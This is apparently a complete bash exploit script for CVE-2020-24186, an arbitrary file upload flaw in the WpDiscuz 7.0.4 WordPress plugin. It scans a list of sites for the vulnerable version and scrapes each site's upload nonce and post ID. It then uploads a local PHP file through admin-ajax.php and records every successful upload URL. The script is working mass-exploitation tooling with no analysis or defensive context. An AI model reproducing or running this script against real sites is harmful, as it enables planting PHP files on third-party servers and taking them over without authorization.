#!/bin/bash
# by meicookies

if [[ -z $(which jq) ]]; then
  apt install jq
  exit
elif [ -z $1 ]; then
  echo -e "\e[93m\n\tCVE-2020-24186\nWpDiscuz 7.0.4 Arbitrary File Upload Exploit\n \e[0m"
  echo "[*] Usage: ./CVE-2020-24186 [web list]"
  echo ""
  exit
fi
files=$1
for i in $(cat $files); do
  # check version
  response=$(curl -s --max-time 1.05 $i/wp-content/plugins/wpdiscuz/readme.txt \
    | grep "Stable tag: 7.0.4")
  if [[ -n $response ]]; then
    # upload file
    echo -e "[+] $i \e[92mvuln\e[0m"
    get_article=$(curl -s $i/index.php/wp-json/wp/v2/posts/ \
      | jq -r ".[] .link" | head -1)
    get_data=$(curl -s $get_article \
      | grep "wpdiscuzAjaxObj" \
      | sed 's/^.*wc_hide_replies_text/{"wc_hide_replies_text/;s/,/,\n/g' \
      | awk '/wmuSecurity/,/wc_post_id/' | sed -n '1p;$p' > .dump)
    wmusec=$(cat .dump | sed 's/^./{"/;s/\,/}/' | jq -r '.wmuSecurity' | head -1)
    pid=$(cat .dump | sed 's/^./{"/;s/\,/}/' | jq -r '.wc_post_id' | head -2 | tail -1)
    up=$(curl -s \
      -F "action=wmuUploadFiles" \
      -F "wmu_nonce=$wmusec" \
      -F "wmuAttachmentsData=undefined" \
      -F "wmu_files[0]=@u.php" \
      -F "postId=$pid" \
       $i/wp-admin/admin-ajax.php)
    # check if file uploaded
    isSucksess=$(echo $up | jq -r ".data .previewsData .images[] .url")
    if [[ -n $isSucksess ]]; then
      echo -e "\e[92m[+]\e[0m $isSucksess \e[92muploaded\e[0m"
      echo "$isSucksess" >> result.txt
    else
      echo -e "\e[91m[-] Gagal gk tau kenapa, coba upload manual hehe\e[0m"
    fi
  else
    echo -e "[-] $i \e[91mgk vuln\e[0m"
  fi
done

